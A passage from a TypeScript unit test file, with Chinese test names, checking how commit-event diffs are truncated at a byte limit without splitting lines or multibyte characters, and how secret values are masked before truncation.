			files: [{ path: "a.txt", additions: 1, deletions: 0 }],
			diff: "diff --git a/a b/a\n+x\n",
			truncated: false,
		});
	});

	it("超过上限：只留开头一段（在整行处截断），标截断；文件统计不受影响", () => {
		const line = `+${"x".repeat(98)}\n`;
		const diff = line.repeat(Math.ceil((LIMIT * 2) / line.length));
		const event = commitEventBody(1, result(diff.slice(0, LIMIT + 1000), false), new Redactor());
		expect(event.truncated).toBe(true);
		expect(Buffer.byteLength(event.diff)).toBeLessThanOrEqual(LIMIT);
		expect(Buffer.byteLength(event.diff)).toBeGreaterThan(LIMIT - 200);
		expect(event.diff.endsWith("\n")).toBe(true);
		expect(event.files).toHaveLength(1);
	});

	it("一行没有换行、全是多字节字符：不在字符中间截断", () => {
		const event = commitEventBody(1, result("汉".repeat(LIMIT), false), new Redactor());
		expect(event.truncated).toBe(true);
		expect(event.diff).not.toContain("�");
		expect(Buffer.byteLength(event.diff)).toBeLessThanOrEqual(LIMIT);
		expect(Buffer.byteLength(event.diff)).toBeGreaterThan(LIMIT - 4);
	});

	it("没取完整份（diffComplete 为 false）：即使取到的不到上限也标截断", () => {
		expect(commitEventBody(1, result("+x\n", false), new Redactor()).truncated).toBe(true);
	});

	it("基准退回到 HEAD 时开头有一行说明，占上限里的字节：总长不超过上限，截断照样标出", () => {
		const note = "（平台还没有记过这个工作区的提交，下面是和空仓库的差异）\n";
		const line = `+${"x".repeat(98)}\n`;
		const diff = line.repeat(Math.ceil((LIMIT * 2) / line.length)).slice(0, LIMIT + 1000);
		const event = commitEventBody(1, { ...result(diff, false), note }, new Redactor());
		expect(event.diff.startsWith(note)).toBe(true);
		expect(event.truncated).toBe(true);
		expect(Buffer.byteLength(event.diff)).toBeLessThanOrEqual(LIMIT);
		const short = commitEventBody(1, { ...result("+x\n"), note }, new Redactor());
		expect(short.diff).toBe(`${note}+x\n`);
		expect(short.truncated).toBe(false);
	});

	it("差异长度在上限和「上限加最长的写法」之间、值正好跨在上限上：值打码，不留下半截", () => {
		const secret = "TOKEN-0123456789-abcdef";
		const redactor = new Redactor();
		redactor.add([secret]);
		expect(redactor.longestBytes).toBeGreaterThanOrEqual(secret.length);
		// 值的开头在上限之前 10 个字节，其余在上限之后：整份差异（已经取完整）比上限长，比「上限加最长的写法」短。
		const straddle = `${"x".repeat(LIMIT - 10)}${secret}`;
		expect(Buffer.byteLength(straddle)).toBeGreaterThan(LIMIT);
		expect(Buffer.byteLength(straddle)).toBeLessThan(LIMIT + redactor.longestBytes);
		const whole = commitEventBody(1, result(straddle), redactor);
		expect(whole.diff).not.toContain("TOK");
		expect(whole.diff.endsWith(SECRET_MASK)).toBe(true);
		expect(whole.truncated).toBe(false);
		expect(Buffer.byteLength(whole.diff)).toBeLessThanOrEqual(LIMIT);
		// 打码之后仍然超过上限：截断，值的开头（在截断点之前）一样没有留下。
		const long = `${"x".repeat(LIMIT - 1)}${secret}${"y".repeat(5)}`;
		const cut = commitEventBody(1, result(long), redactor);
		expect(cut.truncated).toBe(true);
		expect(cut.diff).not.toContain("TOK");
		expect(Buffer.byteLength(cut.diff)).toBeLessThanOrEqual(LIMIT);
	});

	it("secret 的值打码；落在截断点上的值不留下半截（先打码、后截断）", () => {
		const secret = "TOKEN-0123456789-abcdef";
		const redactor = new Redactor();
		redactor.add([secret]);
		const mask = commitEventBody(1, result(`+key=${secret}\n`), redactor);
		expect(mask.diff).not.toContain(secret);
		expect(mask.diff).toContain("+key=");
		// 值跨过上限：开头在上限前几个字节，其余在上限之后。取回的是「上限加最长的写法」那么多字节。
		const pad = "x".repeat(LIMIT - 8);
		const raw = `${pad}${secret}${"y".repeat(secret.length * 2)}`;
		const cut = commitEventBody(
			1,
			result(Buffer.from(raw).subarray(0, LIMIT + redactor.longestBytes), false),
			redactor,
		);
		expect(cut.truncated).toBe(true);
		expect(cut.diff).not.toContain("TOKEN");
		expect(cut.diff).not.toContain("TOK");
		expect(cut.diff).not.toContain(secret.slice(0, 5));
		expect(Buffer.byteLength(cut.diff)).toBeLessThanOrEqual(LIMIT);
	});
});
